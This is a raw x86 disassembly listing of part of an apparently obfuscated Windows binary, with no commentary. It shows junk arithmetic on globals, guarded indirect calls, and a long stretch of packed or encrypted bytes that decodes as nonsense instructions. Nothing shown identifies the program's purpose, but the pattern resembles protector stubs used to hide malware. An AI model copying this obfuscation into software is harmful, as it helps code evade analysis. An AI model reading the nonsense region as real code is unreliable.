  41ca4e:	xor    DWORD PTR ds:0x4284f1,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x4282f9
  41ca5f:	sub    ecx,DWORD PTR ds:0x428489
  41ca65:	mov    DWORD PTR ds:0x4282f9,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x4284a1,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x4283e5,0x0
  41ca8c:	mov    DWORD PTR ds:0x4282f1,edi
  41ca92:	mov    DWORD PTR ds:0x4283bd,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x4283c9,edx
  41caa3:	mov    DWORD PTR ds:0x428499,ebx
  41caa9:	cmp    DWORD PTR ds:0x4283e5,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x4284a1,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428531
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x4283fd,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x4284f1
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x4284f9
  41cae5:	and    ecx,DWORD PTR ds:0x428401
  41caeb:	mov    DWORD PTR ds:0x4284f9,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x4283a9
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41cb5c
  41cb1f:	and    eax,0x49eb90a0
  41cb24:	sar    BYTE PTR [esi-0x41413bb6],0x18
  41cb2b:	pop    ecx
  41cb2c:	inc    edx
  41cb2d:	ret    0xa3bd
  41cb30:	out    dx,eax
  41cb31:	mov    ?,ebp
  41cb33:	cmc    
  41cb34:	adc    DWORD PTR [ecx],eax
  41cb36:	xor    al,0xec
  41cb38:	jg     0x41cb62
  41cb3a:	icebp  
  41cb3b:	mov    eax,0x3e604c3d
  41cb40:	rcl    BYTE PTR [edi],0x14
  41cb43:	daa    
  41cb44:	sti    
  41cb45:	push   edi
  41cb46:	shl    dl,cl
  41cb48:	dec    esp
  41cb49:	pop    es
  41cb4a:	(bad)  
  41cb4b:	call   0x7cdc:0x5c2baa43
  41cb52:	jnp    0x41cb33
  41cb54:	out    0xaa,al
  41cb56:	loope  0x41cb29
  41cb58:	ins    BYTE PTR es:[edi],dx
  41cb59:	xchg   ebx,eax
  41cb5a:	xchg   ecx,eax
  41cb5b:	aas    
  41cb5c:	ror    DWORD PTR [eax-0xaaf2350],0x6e
  41cb63:	loop   0x41cbd5
  41cb65:	retf   0x9c06
  41cb68:	mov    eax,ds:0x799ac8d6
  41cb6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb6e:	sbb    BYTE PTR [eax+0x6c],bl
  41cb71:	jg     0x41cb34
  41cb73:	cld    
  41cb74:	out    0x21,al
  41cb76:	pop    ss
  41cb77:	mov    ch,bh
  41cb79:	(bad)  
  41cb7a:	lock repz std 
  41cb7d:	xor    BYTE PTR [edx-0x35e3fd7e],0xd7
  41cb84:	dec    ebp
  41cb85:	test   al,0xb4
  41cb87:	inc    esp
  41cb88:	lahf   
  41cb89:	sub    DWORD PTR [eax],eax
  41cb8b:	data16 add BYTE PTR [esp+esi*4+0x3],cl
  41cb90:	mov    esp,DWORD PTR [ebp+ebp*4+0x3a]
  41cb94:	pop    ss
  41cb95:	in     eax,dx
  41cb96:	leave  
  41cb97:	mov    edx,0xda2585c8
  41cb9c:	and    al,0x48
  41cb9e:	ret    0xd0d4
  41cba1:	push   0xed314f93
  41cba6:	mov    ebp,0x11dc76ae
  41cbab:	xlat   BYTE PTR ds:[ebx]
  41cbac:	out    0xed,al
  41cbae:	js     0x41cbdf
  41cbb0:	sub    eax,0x79114a02
  41cbb5:	(bad)
  41cbb8:	arpl   WORD PTR ds:0x360c3ca4,bp
  41cbbe:	fs rcl edi,1
  41cbc1:	inc    esp
  41cbc2:	sub    eax,0x963c61e
  41cbc7:	sub    DWORD PTR [esi+0x3b93e656],esi
  41cbcd:	jns    0x41cc37
  41cbcf:	dec    ecx
  41cbd0:	xor    DWORD PTR [ecx-0x2e],eax
  41cbd3:	xchg   esi,eax
  41cbd4:	pop    edi
  41cbd5:	je     0x41cc09
  41cbd7:	pop    edi
  41cbd8:	pop    es
  41cbd9:	push   ecx
  41cbda:	popa   
  41cbdb:	inc    ebx
  41cbdc:	leave  
  41cbdd:	push   edi
  41cbde:	fbstp  TBYTE PTR [esi-0x1d67dc2a]
  41cbe4:	inc    edx
  41cbe5:	shl    DWORD PTR ds:[ebx-0x6c],cl
  41cbe9:	daa    
  41cbea:	out    dx,eax
  41cbeb:	cs aaa 
  41cbed:	inc    edx
  41cbee:	inc    esp
  41cbef:	dec    edx
  41cbf0:	ins    BYTE PTR es:[edi],dx
  41cbf1:	es pop edi
  41cbf3:	loopne 0x41cbaf
  41cbf5:	dec    edx
  41cbf6:	inc    edi
  41cbf7:	jno    0x41cbd7
  41cbf9:	mov    ch,dh
  41cbfb:	test   eax,0x4f38b10f
  41cc00:	xchg   ebx,eax
  41cc01:	sub    esi,esi
  41cc03:	icebp  
  41cc04:	jp     0x41cba1
  41cc06:	lods   al,BYTE PTR ds:[esi]
  41cc07:	and    al,0x58
  41cc09:	pushf  
  41cc0a:	ret    
  41cc0b:	push   ebp
  41cc0c:	into   
  41cc0d:	xor    BYTE PTR ds:0x60a5274c,cl
  41cc13:	test   BYTE PTR [ebx],0x5
  41cc16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc17:	inc    edx
  41cc18:	push   0x14
  41cc1a:	icebp  
  41cc1b:	loope  0x41cba2
  41cc1d:	sbb    edi,edi
  41cc1f:	out    dx,eax
  41cc20:	pusha  
  41cc21:	ret    0x6b12
  41cc24:	popf   
  41cc25:	push   es
  41cc26:	inc    esi
  41cc27:	sbb    ch,bh
  41cc29:	cwde   
  41cc2a:	dec    esp
  41cc2b:	jle    0x41cbcf
  41cc2d:	rcr    DWORD PTR [eax+ecx*1+0x559cc1f9],cl
  41cc34:	je     0x41cbea
  41cc36:	mov    eax,ds:0x50e21b69
  41cc3c:	mov    dl,0xc8
  41cc3e:	pop    edi
  41cc3f:	sar    DWORD PTR [edx],cl
  41cc41:	hlt    
  41cc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc43:	(bad)  
  41cc44:	cld    
  41cc45:	inc    ebx
  41cc46:	push   edi
  41cc47:	jp     0x41cc85
  41cc49:	mov    ch,0x48
  41cc4b:	jno    0x41cc17
  41cc4d:	dec    edx
  41cc4e:	(bad)  
  41cc4f:	ficom  DWORD PTR [eax*8-0x1d07e1]
  41cc56:	mov    ebx,0x2e817270
  41cc5b:	jle    0x41ccb8
  41cc5d:	add    eax,0xabdee0f6
  41cc62:	(bad)  
  41cc65:	xor    DWORD PTR [esi+0x2d],ecx
  41cc68:	mov    eax,0x769737f1
  41cc6d:	loopne 0x41cc6e
  41cc6f:	ds cli 
  41cc71:	punpcklbw mm7,DWORD PTR [ecx+edx*8-0x4788f510]
  41cc79:	cld    
  41cc7a:	add    eax,0xa8516188
  41cc7f:	sar    edx,0x24
  41cc82:	jb     0x41cca4
  41cc84:	rol    DWORD PTR [ebp+0x70],0x72
  41cc88:	mov    al,0x86
  41cc8a:	sub    al,0xbf
  41cc8c:	jle    0x41cc52
  41cc8e:	scas   al,BYTE PTR es:[edi]
  41cc8f:	push   eax
  41cc90:	or     BYTE PTR [ebx],bl
  41cc92:	hlt    
  41cc93:	js     0x41cc98
  41cc95:	aas    
  41cc96:	mov    cl,0xeb
  41cc98:	sbb    ch,BYTE PTR [esi+0x77]
  41cc9b:	fidivr WORD PTR ds:0x449794cb
  41cca1:	pop    edi
  41cca2:	arpl   WORD PTR [edi+0x56],dx
  41cca5:	jle    0x41cceb
  41cca7:	test   al,0x9f
  41cca9:	sub    DWORD PTR [edi+0x2ea0b871],ebx
  41ccaf:	cdq    
  41ccb0:	out    0xa0,al
  41ccb2:	or     BYTE PTR [ecx-0x434bf97d],ah
  41ccb8:	dec    esi
  41ccb9:	loope  0x41ccfe
  41ccbb:	jp     0x41ccf1
  41ccbd:	arpl   cx,di
  41ccbf:	outs   dx,DWORD PTR ds:[esi]
  41ccc0:	repnz imul edx,DWORD PTR [edi],0x8262bb8d
  41ccc7:	test   al,0xdc
  41ccc9:	das    
  41ccca:	inc    ebx
  41cccb:	sub    BYTE PTR [edi],cl
  41cccd:	stc    
  41ccce:	mov    ah,0x41
  41ccd0:	inc    esi
  41ccd1:	sbb    BYTE PTR [eax+eax*2+0x5112af99],ch
  41ccd8:	xchg   ecx,ebx
  41ccda:	rcl    DWORD PTR [ebp+0x3adc537],0x9c
  41cce1:	inc    ebx
  41cce2:	dec    edi
  41cce3:	jg     0x41cd37
  41cce5:	jo     0x41cca9
  41cce7:	xchg   esp,eax
  41cce8:	hlt    
  41cce9:	or     bl,dl
  41cceb:	je     0x41ccb6
  41cced:	call   0x461c056
  41ccf2:	sbb    al,al
  41ccf4:	sbb    BYTE PTR [eax-0x20],bh
  41ccf7:	rcr    al,1
  41ccf9:	mov    dl,0xd5
  41ccfb:	aad    0x53
  41ccfd:	push   edx
  41ccfe:	inc    ecx
  41ccff:	pop    es
  41cd00:	sbb    bh,dh
  41cd02:	pusha  
  41cd03:	rcr    bh,0x47
  41cd06:	xchg   cl,cl
  41cd08:	cmp    BYTE PTR [edx-0x34],dh
  41cd0b:	icebp  
  41cd0c:	loopne 0x41cd67
  41cd0e:	inc    ecx
  41cd0f:	lock int 0xe
  41cd12:	mov    al,0x9e
  41cd14:	fdivr  DWORD PTR [esi+0xdadca8a]
  41cd1a:	bound  ebp,QWORD PTR [eax]
  41cd1c:	push   ds
  41cd1d:	fs call 0x56f0:0xfc437720
  41cd25:	mov    al,0xbb
  41cd27:	mov    edi,0x6bfdd5dc
  41cd2c:	cmp    esi,DWORD PTR [esp+eiz*4-0x6ef331a6]
  41cd33:	scas   al,BYTE PTR es:[edi]
  41cd34:	jo     0x41cd94
  41cd36:	test   eax,0x56c99c71
  41cd3b:	mov    ah,0x24
  41cd3d:	out    0x59,eax
  41cd3f:	addr16 in al,0x7b
  41cd42:	xor    ebx,ebx
  41cd44:	adc    BYTE PTR [edx+0x52],0x14
  41cd48:	ja     0x41cd16
  41cd4a:	mov    bl,0xcd
  41cd4c:	xchg   edx,eax
  41cd4d:	xlat   BYTE PTR ds:[ebx]
  41cd4e:	jl     0x41cd95
  41cd50:	cmp    BYTE PTR [esi-0x67],0x90
  41cd54:	sub    bl,BYTE PTR [esi]
  41cd56:	pop    eax
  41cd57:	push   ebp
  41cd58:	sbb    eax,0x8709288a
  41cd5d:	frndint 
  41cd5f:	jp     0x41cd89
  41cd61:	shl    BYTE PTR cs:0x96423e02,1
  41cd68:	sbb    BYTE PTR ds:0x487ae688,dl
  41cd6e:	clc    
  41cd6f:	retf   0x9713
  41cd72:	outs   dx,DWORD PTR ds:[esi]
  41cd73:	cmp    eax,0x9c0ebc99
  41cd78:	and    ah,BYTE PTR [ecx+0xb]
  41cd7b:	jecxz  0x41cdf9
  41cd7d:	mov    cl,0x52
  41cd7f:	frstor [esi+0x57]
  41cd82:	call   0x87f2564a
  41cd87:	mov    bh,bh
  41cd89:	mov    dh,ah
  41cd8b:	xchg   ecx,eax
  41cd8c:	out    0xff,eax
  41cd8e:	das    
  41cd8f:	mov    edx,0xd41454b1
  41cd94:	sbb    al,0x5b
  41cd96:	in     al,dx
  41cd97:	mov    ch,0x16
  41cd99:	mov    al,0x10
  41cd9b:	sub    BYTE PTR [edi-0x27af7617],ch
  41cda1:	imul   eax,DWORD PTR [ebp-0x7fc6de69],0xd2058dea
  41cdab:	stos   BYTE PTR es:[edi],al
  41cdac:	bound  ebp,QWORD PTR [edi+0x738d66d0]
  41cdb2:	xor    DWORD PTR [esi+0x35],ebp
  41cdb5:	test   BYTE PTR [edi+edx*4-0x642ad6bb],dh
  41cdbc:	push   ds
  41cdbd:	pop    eax
  41cdbe:	push   esi
  41cdc0:	jb     0x41cd4e
  41cdc2:	xor    edx,esp
  41cdc4:	out    0x8f,eax
  41cdc6:	ret    
  41cdc7:	lods   eax,DWORD PTR ds:[esi]
  41cdc8:	es (bad) 
  41cdca:	into   
  41cdcb:	mov    al,ds:0xf3612fa
  41cdd0:	fcom   DWORD PTR [ecx+0x7e]
  41cdd3:	in     eax,0xd9
  41cdd5:	push   ss
  41cdd6:	pusha  
  41cdd7:	icebp  
  41cdd8:	addr16 call 0x7404:0x69667623
  41cde0:	or     edx,DWORD PTR [edx+0x55]
  41cde3:	jne    0x41cdf8
  41cde5:	sbb    ecx,DWORD PTR [eax]
  41cde7:	mov    bl,0x1a
  41cde9:	xchg   edi,eax
  41cdea:	fild   WORD PTR [edx-0x44a99f55]
  41cdf0:	mov    ds:0x7b293089,al
  41cdf5:	jl     0x41cdfc
  41cdf7:	mov    ecx,0x62173b7c
  41cdfc:	jmp    0x41ce67
  41cdfe:	xor    BYTE PTR [ecx+ebp*1+0x46edc0ae],bl
  41ce05:	adc    cl,BYTE PTR [edi+edx*8]
  41ce08:	add    BYTE PTR [edx-0x30c1949a],ch
  41ce0e:	jl     0x41ce5d
  41ce10:	xchg   ebx,eax
  41ce11:	adc    ecx,DWORD PTR ds:0xa2d88146
  41ce17:	adc    ebx,DWORD PTR [ebx-0x4c22fd0c]
  41ce1d:	pusha  
  41ce1e:	cdq    
  41ce1f:	aad    0x20
  41ce21:	jmp    0x3a3092dd
  41ce26:	popf   
  41ce27:	fistp  QWORD PTR ds:0x9eb2773b
  41ce2d:	into   
  41ce2e:	ja     0x41ce59
  41ce30:	add    bh,BYTE PTR [ebx]
  41ce32:	lahf   
  41ce33:	adc    dh,BYTE PTR [ebp-0x6a05ce8]
  41ce39:	fmul   QWORD PTR [ebx]
  41ce3b:	scas   al,BYTE PTR es:[edi]
  41ce3c:	adc    esi,DWORD PTR [ebp+0x3]
  41ce3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce40:	mov    ebp,0xfdb60796
  41ce45:	cld    
  41ce46:	sar    BYTE PTR [edx-0x6049b970],cl
  41ce4c:	and    al,0x78
  41ce4e:	leave  
  41ce4f:	cmp    al,0x5a
  41ce51:	pop    ds
  41ce52:	fnstsw WORD PTR [ebx]
  41ce54:	shl    ebp,0x6c
  41ce57:	adc    dl,BYTE PTR [ebx]
  41ce59:	lea    ecx,[eax]
  41ce5b:	loop   0x41cebd
  41ce5d:	push   edx
  41ce5e:	mul    DWORD PTR [ebp+eax*1-0x6059a740]
  41ce65:	pop    ds
  41ce66:	xchg   esi,eax
  41ce67:	mov    esp,0x2b529214
  41ce6c:	jb     0x41ce31
  41ce6e:	jno    0x41ce78
  41ce70:	scas   eax,DWORD PTR es:[edi]
  41ce71:	out    dx,al
  41ce72:	mov    ah,cl
  41ce74:	sub    al,0x50
  41ce76:	ds sti 
  41ce78:	arpl   WORD PTR [eax+eax*4-0x32f42f9c],bx
  41ce7f:	ss add edx,edx
  41ce82:	fsub   DWORD PTR [ebx+0x5dede63f]
  41ce88:	aaa    
  41ce89:	pop    edx
  41ce8a:	ret    0x8821
  41ce8d:	pop    ebx
  41ce8e:	and    ebp,DWORD PTR [ebx-0x3d57d62e]
  41ce94:	inc    edi
  41ce95:	(bad)  [ecx+0x5f]
  41ce98:	int3   
  41ce99:	daa    
  41ce9a:	sub    bh,BYTE PTR [edx]
  41ce9c:	retf   
  41ce9d:	inc    ebp
  41ce9e:	loope  0x41ce3e
  41cea0:	mov    ch,0x17
  41cea2:	mov    cl,0x4e
  41cea4:	outs   dx,DWORD PTR ds:[esi]
  41cea5:	mov    al,0x2
  41cea7:	cmc    
  41cea8:	imul   ecx,DWORD PTR [ebx-0x3a],0x6f
  41ceac:	(bad)  
  41cead:	test   dx,0x48d5
  41ceb2:	push   esp
  41ceb3:	push   es
  41ceb4:	das    
  41ceb5:	sub    BYTE PTR [esi+0x79],bh
  41ceb8:	loop   0x41ce7b
  41ceba:	outs   dx,BYTE PTR ds:[esi]
  41cebb:	ret    
  41cebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebd:	imul   bh
  41cebf:	sti    
  41cec0:	sar    DWORD PTR [ebx-0x45],1
  41cec3:	mov    edx,0x11cd8b12
  41cec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cec9:	pop    edi
  41ceca:	sbb    al,0x63
  41cecc:	xor    BYTE PTR [eax],dl
  41cece:	add    al,0xc2
  41ced0:	sbb    dh,al
  41ced2:	mov    BYTE PTR [ebx-0x4],dl
  41ced5:	pop    eax
  41ced6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ced7:	call   0x61a83ae4
  41cedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cedd:	sub    BYTE PTR [eax],al
  41cedf:	mov    ebx,0x6832a989
  41cee4:	mov    edi,0x2b71b7f9
  41cee9:	mov    ds:0x23ad64b1,eax
  41ceee:	jno    0x41cf07
  41cef0:	call   0xd885:0xc7bafd05
  41cef7:	(bad)  
  41cef8:	(bad)  
  41cef9:	push   DWORD PTR [edi]
  41cefb:	jne    0x41cefd
  41cefd:	add    BYTE PTR [ecx],dh
  41ceff:	adc    eax,0x428419
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x428489,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x4283f1,0x4284f5
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x4284f1,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x428475,0x4282dd
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428311,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428505,0x0
  41cf60:	mov    DWORD PTR ds:0x4284a1,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428421
  41cf70:	mov    ecx,DWORD PTR ds:0x42841d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x428499
  41cf86:	mov    DWORD PTR ds:0x4282ed,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428505,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x4284fd
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x4282dd
  41cfbb:	sbb    DWORD PTR ds:0x42851d,ecx
  41cfc1:	sub    DWORD PTR ds:0x4283dd,ecx
  41cfc7:	not    DWORD PTR ds:0x428499
  41cfcd:	xor    DWORD PTR ds:0x428495,edi
  41cfd3:	mov    DWORD PTR ds:0x4283d5,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x4284f1
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428511,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x4283e9,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x4282dd,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428515
  41d021:	mov    DWORD PTR ds:0x4283e1,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42840d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x4284fd,edx
  41d040:	cmp    DWORD PTR ds:0x4282dd,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428311
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x428479
  41d060:	mov    esi,DWORD PTR ds:0x4284b1
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x428489,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x4282f5,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428501
  41d07d:	sbb    DWORD PTR ds:0x428405,esi
  41d083:	sbb    DWORD PTR ds:0x428509,0x4283b9
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42830d,0x0
  41d096:	mov    DWORD PTR ds:0x428491,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x4284a1,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x4284fd,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42830d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x4284ed,edx
  41d0df:	xor    DWORD PTR ds:0x4282f9,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x4282d1,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x4283e9,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x4282f5,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428501
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x4282d9
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x42848d,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x4282f5,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x4284e9
  41d15b:	add    esi,DWORD PTR ds:0x42840d
  41d161:	mov    DWORD PTR ds:0x4284e9,esi
  41d167:	mov    esi,DWORD PTR ds:0x4283b1
  41d16d:	and    esi,DWORD PTR ds:0x4283d9
  41d173:	mov    DWORD PTR ds:0x4283b1,esi
  41d179:	sbb    DWORD PTR ds:0x428421,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x4283ed
  41d189:	add    DWORD PTR ds:0x428475,esi
  41d18f:	movzx  esi,WORD PTR ds:0x4283e9
  41d196:	adc    esi,DWORD PTR ds:0x428305
  41d19c:	mov    DWORD PTR ds:0x4283e9,esi
  41d1a2:	xor    DWORD PTR ds:0x4282d9,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x4282fd,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x4282e5,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x4283fd,0x0
  41d1d8:	mov    DWORD PTR ds:0x4284f1,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428419,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x4282d1
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42851d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x4283fd,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428415
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x4283a5
  41d240:	adc    DWORD PTR ds:0x428475,esi
  41d246:	sub    DWORD PTR ds:0x428489,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428501,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x4283d9,0x0
  41d265:	mov    DWORD PTR ds:0x4282fd,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x42846d
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x4284ed,ebx
  41d285:	movzx  eax,WORD PTR ds:0x4283bd
  41d28c:	cmp    DWORD PTR ds:0x4283d9,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x4281e3
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x4284e9
  41d2be:	xor    DWORD PTR ds:0x428485,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428411,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x4284fd,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428511
  41d2dc:	add    DWORD PTR ds:0x4282ed,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x4284b9
  41d2ec:	mov    edx,DWORD PTR ds:0x428551
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x4283dd,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x428479,0x0
  41d329:	mov    DWORD PTR ds:0x4284a1,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x4282f1
  41d33a:	mov    ecx,DWORD PTR ds:0x4283d1
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x4283ad,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428309,edi
  41d355:	cmp    DWORD PTR ds:0x428479,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428335
  41d377:	mov    edx,DWORD PTR ds:0x428559
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x428455
  41d38e:	mov    edx,DWORD PTR ds:0x42854d
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x428491,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42851d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x428379
  41d3b2:	mov    edx,DWORD PTR ds:0x42842d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x428345
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x428351
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x4283a9
  41d412:	xor    DWORD PTR ds:0x428475,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42851d,0x4282d9
